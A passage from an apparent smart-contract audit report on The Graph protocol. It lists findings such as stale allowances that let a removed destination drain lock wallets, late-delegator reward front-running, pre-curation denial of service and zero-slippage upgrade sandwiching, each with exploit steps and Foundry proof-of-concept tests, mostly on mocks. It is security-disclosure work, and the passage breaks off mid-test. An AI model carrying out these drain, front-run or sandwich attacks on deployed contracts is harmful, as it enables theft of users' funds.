### Finding Status Justification: The described allowance state is mechanically correct. approveProtocol grants max allowance to destinations in the manager set. removeTokenDestination deletes a destination, and revokeProtocol then cannot enumerate or zero it. The removed spender can retain transferFrom allowance from prior approvals. There is no historical destination revocation or arbitrary spender revoke safeguard in the shown code.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
GraphTokenLockWallet approves every current manager token destination for uint256.max, but revokeProtocol only revokes destinations that are still present in the manager set. GraphTokenLockManager.removeTokenDestination deletes the destination from that set, so a beneficiary can no longer revoke the old allowance through the wallet's provided revocation path. The removed destination remains an ERC20 spender for every wallet that previously called approveProtocol and can continue pulling locked GRT even though manager authorization was revoked.

Vulnerable snippets:

GraphTokenLockWallet.approveProtocol():
address[] memory dstList = manager.getTokenDestinations();
for (uint256 i = 0; i < dstList.length; i++) {
    token.approve(dstList[i], type(uint256).max);
}

GraphTokenLockWallet.revokeProtocol():
address[] memory dstList = manager.getTokenDestinations();
for (uint256 i = 0; i < dstList.length; i++) {
    token.approve(dstList[i], 0);
}

GraphTokenLockManager.removeTokenDestination():
require(_tokenDestinations.remove(_dst), "Destination already removed");

After _dst is removed, getTokenDestinations() no longer returns it, so revokeProtocol cannot clear its allowance.

## Impact
A previously authorized destination with public pull logic, compromised logic, or any user-triggerable transferFrom path can drain locked GRT from all wallets that approved it before removal. For large token lock wallets this can cause significant user funds to be stolen directly from protocol lock-wallet contracts.

## Proof of Concept
1. Manager owner adds a protocol destination D.
2. A lock wallet beneficiary calls approveProtocol(), granting D uint256.max GRT allowance from the wallet.
3. Manager owner removes D with removeTokenDestination(D), intending to deauthorize it.
4. The beneficiary calls revokeProtocol(), but the removed D is no longer returned by getTokenDestinations(), so its allowance remains unchanged.
5. Any caller invokes D's public pull path, or D itself calls token.transferFrom(wallet, attacker, amount), draining locked tokens from the wallet despite removal from the manager authorization set.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {GraphTokenLockManager} from "../contracts/GraphTokenLockManager.sol";
import {GraphTokenLockWallet} from "../contracts/GraphTokenLockWallet.sol";
import {IGraphTokenLock} from "../contracts/IGraphTokenLock.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 {
    string public name = "Mock GRT";
    string public symbol = "GRT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract PullDestination {
    function drain(address token, address from, address to, uint256 amount) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

contract StaleDestinationAllowanceTest is Test {
    function testRemovedDestinationStillDrainsWallet() external {
        address walletOwner = address(0xA11CE);
        address beneficiary = address(0xB0B);
        address attacker = address(0xE0A);
        uint256 amount = 1_000_000 ether;

        MockERC20 token = new MockERC20();
        GraphTokenLockWallet masterCopy = new GraphTokenLockWallet();
        GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(masterCopy));
        PullDestination destination = new PullDestination();

        token.mint(address(this), amount);
        token.approve(address(manager), amount);
        manager.deposit(amount);
        manager.addTokenDestination(address(destination));

        uint256 start = block.timestamp + 1;
        uint256 end = start + 100;
        bytes memory initializer = abi.encodeWithSelector(
            GraphTokenLockWallet.initialize.selector,
            address(manager),
            walletOwner,
            beneficiary,
            address(token),
            amount,
            start,
            end,
            uint256(10),
            uint256(0),
            uint256(0),
            IGraphTokenLock.Revocability.Disabled
        );
        address wallet = manager.getDeploymentAddress(keccak256(initializer), address(masterCopy), address(manager));

        manager.createTokenLockWallet(
            walletOwner,
            beneficiary,
            amount,
            start,
            end,
            10,
            0,
            0,
            IGraphTokenLock.Revocability.Disabled
        );

        vm.prank(beneficiary);
        GraphTokenLockWallet(wallet).approveProtocol();
        assertEq(token.allowance(wallet, address(destination)), type(uint256).max);

        manager.removeTokenDestination(address(destination));

        vm.prank(beneficiary);
        GraphTokenLockWallet(wallet).revokeProtocol();
        assertEq(token.allowance(wallet, address(destination)), type(uint256).max);

        destination.drain(address(token), wallet, attacker, amount);
        assertEq(token.balanceOf(attacker), amount);
        assertEq(token.balanceOf(wallet), 0);
    }
}

## Suggested Mitigation
Do not remove destinations from the only revocation enumeration. Keep a historical destination set for revokeProtocol(), track per-wallet approved destinations, or add a wallet function that allows the beneficiary to revoke any prior destination directly. A safer manager design is to mark destinations inactive for new approvals while retaining them in a revoke-all list until allowances are known to be cleared.


## [H-48]. Late delegator can front-run SubgraphService.collect and capture historical indexing rewards

## id: hPmA41X7Gv-5BNaMRzCSj

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
SubgraphService.collect(IndexingRewards)

## Finding Status: Valid
### Finding Status Justification: The described path exists in the provided production SubgraphService/AllocationManager code. collect(IndexingRewards) reaches _collectIndexingRewards(), which calls _presentPoi(), then _distributeIndexingRewards(). That function reads the current HorizonStaking delegation fee cut and live getDelegationPool(indexer,address(this)); if pool.shares > 0 it sends the delegator cut into the current delegation pool with addToDelegationPool. No allocation-level delegation snapshot, accrual-time user index, or reward debt is shown. Therefore a delegator entering before collection can participate in rewards accrued before entry, and if prior pool.shares was zero, making shares positive changes the split from zero delegator rewards to delegatorCut. The target files are explicitly in scope. No complete safeguard or explicit accepted-risk documentation is provided. Exploitation uses public delegation mechanics plus an authorized collect transaction, not privileged abuse by the attacker, user mistake, or a future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Indexing rewards accrued by an allocation are distributed to the delegation pool using the live delegation pool at collection time. Vulnerable snippet in `AllocationManager._distributeIndexingRewards`: `pool = _graphStaking().getDelegationPool(_allocation.indexer, address(this)); tokensDelegationRewards = pool.shares > 0 ? _rewardsCollected.mulPPM(delegatorCut) : 0; ... _graphStaking().addToDelegationPool(_allocation.indexer, address(this), tokensDelegationRewards);`. There is no allocation-level snapshot of delegator shares and no reward debt preventing a new delegator from sharing rewards accrued before they delegated. If `pool.shares` was zero during accrual, a dust delegation immediately before collection can also switch the entire delegator cut on and divert rewards that otherwise would have gone to the indexer.

## Impact
Historical indexing rewards can be redirected to a short-term delegator instead of long-term delegators or the indexer. The loss is bounded by the delegator cut on collected indexing rewards and can be repeated around large reward collections.

## Proof of Concept
1. An allocation accrues indexing rewards over time while the attacker has no delegation to the indexer. 2. The attacker monitors for, or predicts, an authorized `collect(IndexingRewards)` call. 3. Immediately before collection, the attacker delegates enough GRT to create or dominate current delegation pool shares. 4. `collect` calls `_distributeIndexingRewards`, reads the live pool, and sends the historical delegator cut to the current delegation pool. 5. The attacker later withdraws or realizes the inflated pool value, capturing rewards from a period where they provided no delegation.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockStaking { struct DelegationPool { uint256 shares; } mapping(address => DelegationPool) public pools; mapping(address => mapping(address => uint256)) public sharesOf; mapping(address => uint256) public accRewardPerShare; function delegate(address indexer, uint256 amount) external { sharesOf[indexer][msg.sender] += amount; pools[indexer].shares += amount; } function getDelegationFeeCut(address, address, uint8) external pure returns (uint256) { return 500_000; } function getDelegationPool(address indexer, address) external view returns (DelegationPool memory) { return pools[indexer]; } function addToDelegationPool(address indexer, address, uint256 amount) external { require(pools[indexer].shares > 0); accRewardPerShare[indexer] += amount * 1e18 / pools[indexer].shares; } function claimable(address indexer, address user) external view returns (uint256) { return sharesOf[indexer][user] * accRewardPerShare[indexer] / 1e18; } }
contract VulnerableIndexingRewardService { MockStaking public staking; constructor(MockStaking s) { staking = s; } function collectIndexingRewards(address indexer, uint256 rewardsCollected) external { uint256 delegatorCut = staking.getDelegationFeeCut(indexer, address(this), 1); MockStaking.DelegationPool memory pool = staking.getDelegationPool(indexer, address(this)); uint256 tokensDelegationRewards = pool.shares > 0 ? rewardsCollected * delegatorCut / 1_000_000 : 0; if (tokensDelegationRewards > 0) staking.addToDelegationPool(indexer, address(this), tokensDelegationRewards); } }
contract LateDelegatorFreeRidePoC is Test { function testLateDelegatorCapturesHistoricalIndexingRewards() public { address indexer = address(0x1); address attacker = address(0xA11CE); MockStaking staking = new MockStaking(); VulnerableIndexingRewardService service = new VulnerableIndexingRewardService(staking); vm.prank(attacker); staking.delegate(indexer, 1 ether); service.collectIndexingRewards(indexer, 1_000_000 ether); assertEq(staking.claimable(indexer, attacker), 500_000 ether); assertGt(staking.claimable(indexer, attacker), 0); } }

## Suggested Mitigation
Snapshot delegation shares or delegated stake for each allocation reward accrual period, and distribute rewards according to that snapshot. Alternatively, update per-user reward debt on delegate/undelegate so new shares are not entitled to rewards accrued before entry, and preserve the indexer share when the pool had no eligible shares during the accrual window.


## [L-49]. Related conflict dispute is marked Drawn without DisputeDrawn event in DisputeManager.drawDispute

## id: _0HWg2QfaUadZlFaexEyd

## Derived From Pattern/Invariant
AccountingInvariantViolation: every dispute status transition to Drawn must emit a matching DisputeDrawn event for that same disputeID

## Exploit Type
AccountingInvariantViolation

## Location
DisputeManager._drawDisputeInConflict

## Finding Status: Valid
### Finding Status Justification: _drawDisputeInConflict directly mutates the related dispute status to Drawn and returns true without emitting any event. The outer drawDispute emits DisputeDrawn only for the supplied disputeID after setting that dispute's status. Therefore a linked conflict pair can have both statuses Drawn in storage but only one event in logs. This is in the scoped DisputeManager. It requires ordinary arbitrator resolution of a pending dispute, not privileged-role abuse, and there is no explicit documentation accepting the missing related event.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
drawDispute emits DisputeDrawn only for the disputeID supplied by the arbitrator, but _drawDisputeInConflict silently changes the related pending dispute to Drawn. The vulnerable flow is: drawDispute calls _drawDisputeInConflict(dispute); then sets dispute.status = Drawn; then emits DisputeDrawn only for _disputeID. Inside _drawDisputeInConflict, relatedDispute.status = IDisputeManager.DisputeStatus.Drawn is written with no corresponding DisputeDrawn(relatedDisputeID, ...) emission. This breaks event/state reconciliation for linked disputes: both disputes become terminal Drawn on-chain, but off-chain systems observing the event stream see only one Drawn transition.

## Impact
Off-chain accounting, dispute monitors, and indexers that rely on DisputeDrawn events can retain a stale Pending state for the automatically resolved related dispute. The on-chain funds impact is limited because conflict disputes have zero deposit, but protocol state and emitted audit trail diverge for a terminal dispute transition.

## Proof of Concept
1. Create a conflict dispute pair so disputes[d1].relatedDisputeID == d2 and disputes[d2].relatedDisputeID == d1, with both statuses Pending. 2. The arbitrator calls drawDispute(d1). 3. _drawDisputeInConflict sets disputes[d2].status = Drawn. 4. drawDispute emits DisputeDrawn only for d1. 5. Reading storage shows both d1 and d2 are Drawn, while log reconciliation finds only one DisputeDrawn event.

## Proof of Code
pragma solidity ^0.8.20; import "forge-std/Test.sol"; contract DrawHarness { enum Status { Null, Pending, Accepted, Rejected, Drawn } struct Dispute { bytes32 relatedDisputeID; Status status; } mapping(bytes32 => Dispute) private disputes; event DisputeDrawn(bytes32 indexed disputeID, address indexed indexer, address indexed fisherman, uint256 tokens); function createPair(bytes32 a, bytes32 b) external { disputes[a] = Dispute(b, Status.Pending); disputes[b] = Dispute(a, Status.Pending); } function statusOf(bytes32 id) external view returns (Status) { return disputes[id].status; } function drawDispute(bytes32 id) external { Dispute memory dispute = disputes[id]; _drawDisputeInConflict(dispute); disputes[id].status = Status.Drawn; emit DisputeDrawn(id, address(1), address(2), 0); } function _isDisputeInConflict(Dispute memory dispute) private view returns (bool) { bytes32 relatedID = dispute.relatedDisputeID; return relatedID != bytes32(0) && disputes[relatedID].status == Status.Pending; } function _drawDisputeInConflict(Dispute memory dispute) private returns (bool) { if (_isDisputeInConflict(dispute)) { disputes[dispute.relatedDisputeID].status = Status.Drawn; return true; } return false; } } contract DrawEventPoC is Test { function testRelatedDrawStatusChangeEmitsOnlyOneEvent() public { DrawHarness h = new DrawHarness(); bytes32 a = keccak256(bytes("a")); bytes32 b = keccak256(bytes("b")); h.createPair(a, b); vm.recordLogs(); h.drawDispute(a); Vm.Log[] memory entries = vm.getRecordedLogs(); bytes32 drawnSig = keccak256(bytes("DisputeDrawn(bytes32,address,address,uint256)")); uint256 drawnEvents; for (uint256 i = 0; i < entries.length; i++) { if (entries[i].topics.length > 0 && entries[i].topics[0] == drawnSig) drawnEvents++; } assertEq(uint256(h.statusOf(a)), 4); assertEq(uint256(h.statusOf(b)), 4); assertEq(drawnEvents, 1); } }

## Suggested Mitigation
When _drawDisputeInConflict resolves a related dispute, emit DisputeDrawn for relatedDisputeID with the related dispute's indexer, fisherman, and deposit. Alternatively, return the related dispute ID from the helper and emit the event in drawDispute after the status write.


## [M-50]. Pre-curation frontrun DoS blocks L1GNS.publishNewVersion for target deployments

## id: Quc09KbutHkD5n-3xHiP5

## Derived From Pattern/Invariant
GovernanceFrontrunDoS

## Exploit Type
GovernanceFrontrunDoS

## Location
GNS (inherited by L1GNS).publishNewVersion

## Finding Status: Valid
### Finding Status Justification: The cited code path exists in in-scope GNS inherited by L1GNS. publishNewVersion checks !curation.isCurated(_subgraphDeploymentID) before changing the target deployment, and curation is treated as permissionless. A third party can make the target deployment curated before the owner transaction executes, causing the require to fail. The comment explains the owner self-dealing protection, but it does not explicitly accept third-party pre-curation DoS as intended risk. No commit-reveal, reservation, threshold, or owner override fully blocks this exact path.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
GNS.publishNewVersion() lets a subgraph owner retarget an active subgraph, but it first requires the destination deployment to have no existing curation. Because curation of deployments is permissionless, a mempool observer can front-run the owner's upgrade by curating the target deployment first, making the owner's transaction revert and keeping the subgraph stuck on the old deployment. Vulnerable snippet: `require(!curation.isCurated(_subgraphDeploymentID), "GNS: Owner cannot point to a subgraphID that has been pre-curated");`

## Impact
A permissionless attacker can repeatedly block a subgraph owner from publishing a chosen new version. This is a functional DoS of subgraph lifecycle upgrades, forcing owners to choose a different deployment, wait for the attacker to fully exit curation, or deprecate the subgraph. No direct GRT theft is shown, so severity is Medium.

## Proof of Concept
1. Subgraph owner submits publishNewVersion(subgraphID, newDeploymentID, metadata). 2. MEV searcher sees newDeploymentID in the mempool. 3. Searcher front-runs by curating newDeploymentID through the Curation contract. 4. Owner transaction executes after the front-run and reverts at the isCurated(newDeploymentID) check. 5. The attacker can leave dust curation on that deployment or repeat against future target deployments to keep blocking upgrades.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockCuration {
    mapping(bytes32 => bool) public curated;

    function isCurated(bytes32 id) external view returns (bool) {
        return curated[id];
    }

    function mint(bytes32 id, uint256, uint256) external returns (uint256, uint256) {
        curated[id] = true;
        return (1, 0);
    }
}

contract GNSPublishHarness {
    MockCuration public curation;
    bytes32 public deployment = bytes32("old");
    address public owner;

    constructor(MockCuration c) {
        curation = c;
        owner = msg.sender;
    }

    function publishNewVersion(bytes32 newDeployment) external {
        require(msg.sender == owner, "GNS: Must be authorized");
        require(newDeployment != deployment, "GNS: Cannot publish a new version with the same subgraph deployment ID");
        require(!curation.isCurated(newDeployment), "GNS: Owner cannot point to a subgraphID that has been pre-curated");
        deployment = newDeployment;
    }
}

contract PublishNewVersionPrecurationDoSTest is Test {
    function testFrontrunPrecurationBlocksVersionUpgrade() public {
        address owner = address(0xA11CE);
        address attacker = address(0xB0B);
        MockCuration curation = new MockCuration();

        vm.prank(owner);
        GNSPublishHarness gns = new GNSPublishHarness(curation);

        bytes32 targetDeployment = keccak256("target deployment");

        vm.prank(attacker);
        curation.mint(targetDeployment, 1 ether, 0);
        assertEq(curation.curated(targetDeployment), true);

        vm.prank(owner);
        vm.expectRevert(bytes("GNS: Owner cannot point to a subgraphID that has been pre-curated"));
        gns.publishNewVersion(targetDeployment);

        assertEq(gns.deployment(), bytes32("old"));
    }
}

## Suggested Mitigation
Do not make a permissionless pre-curation state an absolute veto for owner upgrades. Replace the isCurated() ban with explicit slippage bounds/snapshots for the migration, or use a commit-reveal/version reservation flow so third parties cannot learn and pre-curate the target deployment before the owner upgrade executes.


## [M-51]. Dust pre-curation can permanently block GNS.publishNewVersion for a target deployment

## id: s3Jcahv1Z1ZKtUXwnOqA1

## Derived From Pattern/Invariant
FrontrunMev

## Exploit Type
FrontrunMev

## Location
GNS.publishNewVersion

## Finding Status: Valid
### Finding Status Justification: publishNewVersion in the in-scope GNS code rejects any target deployment for which curation.isCurated returns true. Because curation is permissionless, a non-owner can curate the deployment before or between owner attempts. Once that state is true, the same target deployment cannot be published through this function while it remains curated. The owner self-front-run comment explains why the guard exists, but does not explicitly document and accept third-party censorship. There is no complete mitigation such as commit-reveal, reservation, or owner-authorized bypass.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
publishNewVersion() rejects any target deployment that is already curated: `require(!curation.isCurated(_subgraphDeploymentID), "GNS: Owner cannot point to a subgraphID that has been pre-curated");`. Since curation is permissionless, a mempool observer can front-run the owner's upgrade by curating the target deployment with dust. Once `isCurated(_subgraphDeploymentID)` becomes true, every future attempt to publish that exact deployment ID reverts, even though the attacker is not the subgraph owner. This turns a protection against owner abuse into a permissionless deployment-level denial of service.

## Impact
An attacker can censor a subgraph owner's upgrade to a specific deployment hash. This can block publication of the intended canonical version and force the owner to change deployment content/hash or abandon the upgrade path for that deployment.

## Proof of Concept
1. The owner prepares publishNewVersion(subgraphID, targetDeploymentID, metadata). 2. A searcher sees targetDeploymentID in the mempool. 3. The searcher front-runs with a dust curation mint directly in Curation for targetDeploymentID. 4. Curation now returns true for isCurated(targetDeploymentID). 5. The owner transaction and all future retries for that same deployment ID revert at the pre-curation guard.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract MockCurationFlag { mapping(bytes32 => bool) public curated; function mint(bytes32 id) external { curated[id] = true; } function isCurated(bytes32 id) external view returns (bool){ return curated[id]; } }
contract MockGNSUpgradeGate { MockCurationFlag public c; constructor(MockCurationFlag _c){ c = _c; } function publishNewVersion(bytes32 deploymentID) external view { require(!c.isCurated(deploymentID), "GNS: Owner cannot point to a subgraphID that has been pre-curated"); } }
contract PrecurationDoSPoC is Test { function testDustPrecurationBlocksPublishNewVersion() external { MockCurationFlag c = new MockCurationFlag(); MockGNSUpgradeGate gns = new MockGNSUpgradeGate(c); bytes32 target = keccak256("canonical deployment"); c.mint(target); vm.expectRevert(bytes("GNS: Owner cannot point to a subgraphID that has been pre-curated")); gns.publishNewVersion(target); assertEq(c.isCurated(target), true); } }

## Suggested Mitigation
Replace the absolute `!isCurated()` veto with a mechanism that cannot be triggered by arbitrary third parties, such as an owner-created reservation/commitment for the target deployment, a bounded pre-curation threshold, or logic that permits the owner to migrate to pre-curated deployments while preventing only the specific owner self-dealing case the guard was intended to stop.


## [H-52]. Zero-min curation remint lets MEV sandwich GNS upgrades and extract curator value

## id: LvSXBtfhMrPaWyLPL5LsI

## Derived From Pattern/Invariant
FlashLoanEconomicManipulation

## Exploit Type
FlashLoanEconomicManipulation

## Location
GNS.publishNewVersion

## Finding Status: Valid
### Finding Status Justification: The publishNewVersion code exists and, when nSignal is nonzero, burns all old deployment vSignal with curation.burn(..., 0), charges owner tax, then mints into the new deployment with curation.mint(..., 0). The old-deployment burn accepts any token output and is exposed to public curation market state. No minimum burn output, minimum minted signal, deadline, or price check is present. The pre-curation guard may prevent pre-minting the new deployment, but it does not protect the old-deployment burn leg, so the root cause remains live.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
publishNewVersion() migrates all name-pool vSignal from the old deployment into a new deployment using the live Curation bonding-curve price and passes zero slippage bounds to both legs. Vulnerable snippet: uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0); ... (subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);. A permissionless searcher can manipulate the old deployment's curation price immediately before the owner upgrade executes, force the GNS burn to accept a depressed token amount, then unwind after the upgrade. Because the whole curator pool is migrated with minOut=0, name curators receive fewer tokens/signal in the new deployment while the attacker captures the price movement.

## Impact
For subgraphs with large curated value, a sandwich or flash-loan manipulation around an owner upgrade can transfer significant GRT value from name curators to the attacker. If the affected pool exceeds $1M, this matches the program's High economic-loss impact.

## Proof of Concept
1. A subgraph has substantial nSignal/vSignal backed by the Curation bonding curve. 2. The subgraph owner submits publishNewVersion() to migrate to a new deployment. 3. A permissionless searcher observes the transaction and manipulates the old deployment's spot curation price in the same block. 4. The owner transaction executes curation.burn(oldDeployment, vSignal, 0) and accepts the manipulated low token output, then executes curation.mint(newDeployment, tokensWithTax, 0) with no lower bound. 5. The searcher unwinds the manipulation, keeping the extracted value while all GNS name curators are left with less backing in the new deployment.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract MockCuration {
    uint256 public oldBurnPrice = 1e18;
    uint256 public newMintPrice = 1e18;
    function setOldBurnPrice(uint256 p) external { oldBurnPrice = p; }
    function burn(bytes32, uint256 vSignal, uint256 minOut) external view returns (uint256 tokens) {
        tokens = vSignal * oldBurnPrice / 1e18;
        require(tokens >= minOut);
    }
    function mint(bytes32, uint256 tokens, uint256 minOut) external view returns (uint256 vSignal, uint256 tax) {
        vSignal = tokens * 1e18 / newMintPrice;
        require(vSignal >= minOut);
        tax = 0;
    }
}
contract VulnerableGNS {
    MockCuration public c;
    bytes32 public dep = bytes32(uint256(1));
    uint256 public vSignal = 1_000_000 ether;
    constructor(MockCuration _c) { c = _c; }
    function quoteUpgrade() external view returns (uint256) {
        uint256 tokens = vSignal * c.oldBurnPrice() / 1e18;
        return tokens * 1e18 / c.newMintPrice();
    }
    function publishNewVersion(bytes32 newDep) external {
        uint256 tokens = c.burn(dep, vSignal, 0);
        (uint256 newSignal,) = c.mint(newDep, tokens, 0);
        vSignal = newSignal;
        dep = newDep;
    }
}
contract GNSPublishNewVersionPOC is Test {
    function testZeroMinUpgradeAcceptsManipulatedPrice() public {
        MockCuration c = new MockCuration();
        VulnerableGNS g = new VulnerableGNS(c);
        uint256 fair = g.quoteUpgrade();
        c.setOldBurnPrice(1e16);
        g.publishNewVersion(bytes32(uint256(2)));
        assertGt(fair, 900_000 ether);
        assertLt(g.vSignal(), fair / 50);
    }
}

## Suggested Mitigation
Add slippage parameters to publishNewVersion(), e.g. minimum tokens returned from the old curation burn and minimum vSignal minted on the new deployment. Apply the checks to the exact live outputs, and consider a commit/reveal or bounded TWAP-style price check for large migrations.


## [M-53]. Late delegators can front-run reward distribution and capture historical delegation rewards

## id: sy0gIS3xnXU4griUAX-Vq

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
StakingExtension.delegate

## Finding Status: Valid
### Finding Status Justification: The finding matches the provided in-scope staking code. delegate() is implemented in StakingExtension and mints immediately usable shares based only on the current pool token/share ratio. Both _collectDelegationQueryRewards and _collectDelegationIndexingRewards add newly distributed delegation rewards to the same live pool.tokens balance. The code has no allocation-time share snapshot, rewardDebt, userRewardPerTokenPaid, activation delay, or exclusion for shares minted shortly before distribution. The preconditions are realistic whenever rewards are pending and an indexer is staked. Exploitation is permissionless and current, with no reliance on privileged compromise or pure user error.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation rewards are added to the current delegation pool balance at collection or allocation close time, but users who join immediately before that distribution receive shares and participate in the whole reward. The vulnerable share minting in _delegate uses only the live pool ratio: uint256 shares = (pool.tokens == 0) ? delegatedTokens : delegatedTokens.mul(pool.shares).div(pool.tokens); pool.tokens = pool.tokens.add(delegatedTokens); pool.shares = pool.shares.add(shares). Later, historical rewards are credited to the same live pool: _collectDelegationQueryRewards and _collectDelegationIndexingRewards both do pool.tokens = pool.tokens.add(delegationRewards). There is no per-user rewardDebt, userRewardPerTokenPaid, holding period, or allocation-time snapshot, so a large late delegator can buy into already-accrued but not-yet-distributed rewards.

## Impact
Long-term delegators who supplied delegation during the allocation or query-fee accrual period can have their accrued rewards diluted and transferred to a short-term late joiner. With large pending allocation rewards or query fee collections, this can produce direct monetary loss of rewards for existing delegators and corresponding gain for the attacker.

## Proof of Concept
1. Existing delegators hold shares in an indexer's delegation pool while an allocation accrues indexing rewards or query fees wait to be collected. 2. The attacker observes a pending collect() or closeAllocation() transaction that will credit delegationRewards to pool.tokens. 3. The attacker front-runs with a large delegate(indexer, amount), receiving shares at the pre-reward pool price. 4. The reward distribution executes and increases pool.tokens for all current shares. 5. The attacker owns most shares during the distribution and captures most of the historical reward. 6. The attacker exits by undelegating after the required delay, or by migrating delegation to L2 when the indexer is eligible.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract DelegationPoolModel {
    uint256 public tokens;
    uint256 public shares;
    mapping(address => uint256) public sharesOf;

    function seed(address user, uint256 amount) external {
        require(shares == 0);
        tokens = amount;
        shares = amount;
        sharesOf[user] = amount;
    }

    function delegate(address user, uint256 amount) external returns (uint256 mintedShares) {
        mintedShares = tokens == 0 ? amount : amount * shares / tokens;
        require(mintedShares > 0);
        tokens += amount;
        shares += mintedShares;
        sharesOf[user] += mintedShares;
    }

    function distributeDelegationRewards(uint256 reward) external {
        tokens += reward;
    }

    function valueOf(address user) external view returns (uint256) {
        return sharesOf[user] * tokens / shares;
    }
}

contract LateDelegatorRewardPoC is Test {
    DelegationPoolModel pool;
    address alice = address(0xA11CE);
    address attacker = address(0xB0B);

    function setUp() public {
        pool = new DelegationPoolModel();
    }

    function testLateJoinerCapturesHistoricalReward() public {
        pool.seed(alice, 1000 ether);
        pool.delegate(attacker, 9000 ether);
        pool.distributeDelegationRewards(100 ether);

        uint256 aliceValue = pool.valueOf(alice);
        uint256 attackerValue = pool.valueOf(attacker);

        assertEq(aliceValue, 1010 ether);
        assertEq(attackerValue - 9000 ether, 90 ether);
        assertEq((1000 ether + 100 ether) - aliceValue, 90 ether);
        assertGt(attackerValue, 9000 ether);
    }
}

## Suggested Mitigation
Checkpoint rewards per delegator. Track a per-pool reward index and per-user rewardDebt/userRewardPerTokenPaid so new shares only accrue rewards after deposit. For allocation rewards, snapshot eligible delegation shares at allocation creation or reward accrual boundaries, or enforce a minimum holding period before new shares can receive already-accrued rewards.


## [L-54]. HorizonStakingBase.getThawedTokens uses provision thawing state for delegation requests and can revert or misreport

## id: VWv7fUzI7itheEB82gMzD

## Derived From Pattern/Invariant
AccountingInvariantViolation: delegation thaw getters must use delegation-pool thawing accounting

## Exploit Type
AccountingInvariantViolation

## Location
HorizonStakingBase.getThawedTokens

## Finding Status: Valid
### Finding Status Justification: The getter exists in in-scope HorizonStakingBase. getThawedTokens() accepts requestType but unconditionally loads Provision storage and uses prov.tokensThawing, prov.sharesThawing, and prov.thawingNonce. Delegation thaw accounting is maintained in DelegationPoolInternal by _undelegate() and _withdrawDelegated(), with pool.tokensThawing, pool.sharesThawing, and pool.thawingNonce. For a mature delegation thaw request when provision thawing shares are zero, the mature branch divides by prov.sharesThawing and can revert; if provider thawing exists, it can compute using unrelated provision values. No branch on requestType safeguards delegation queries. This is a public accounting/view-surface bug in production scope, presently reachable by ordinary delegators.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
getThawedTokens(requestType, serviceProvider, verifier, owner) always loads Provision storage and uses prov.tokensThawing, prov.sharesThawing, and prov.thawingNonce, even when requestType is Delegation. Delegation thaw requests are accounted in DelegationPoolInternal. For a valid expired delegation thaw request with no provider thawing, prov.sharesThawing is zero, so the getter can divide by zero; if provider thawing exists, it reports a value derived from unrelated provision accounting. Vulnerable snippet: Provision storage prov = _provisions[serviceProvider][verifier]; uint256 tokensThawing = prov.tokensThawing; uint256 sharesThawing = prov.sharesThawing; ... if (thawRequest.thawingNonce == prov.thawingNonce) { ... uint256 tokens = (thawRequest.shares * tokensThawing) / sharesThawing; }.

## Impact
Protocol consumers, keepers, frontends, and integrations reading the public getter for delegation withdrawals can receive incorrect thawed-token amounts or a revert for valid delegation state. This breaks the public accounting surface and can cause withdrawal automation or user flows to fail.

## Proof of Concept
1. A delegator delegates to an existing provision. 2. The delegator calls undelegate(), creating a Delegation thaw request and increasing pool.tokensThawing/pool.sharesThawing. 3. No provider thaw request exists, so prov.sharesThawing remains zero. 4. After the delegation thawingUntil passes, calling getThawedTokens(Delegation, serviceProvider, verifier, delegator) enters the mature branch and divides by prov.sharesThawing, reverting, despite withdrawDelegated() being able to use the delegation pool state.

## Proof of Code
function test_getThawedTokensDelegationUsesWrongPoolAndReverts() public {
    address sp = makeAddr("sp");
    address verifier = makeAddr("verifier");
    address delegator = makeAddr("delegator");

    stakingHarness.setDeprecatedThawingPeriod(0);
    stakingHarness.setServiceProviderStake(sp, 100 ether, 0);
    vm.prank(sp);
    stakingHarness.provision(sp, verifier, 100 ether, 0, 1 days);

    deal(address(grt), delegator, 10 ether);
    vm.startPrank(delegator);
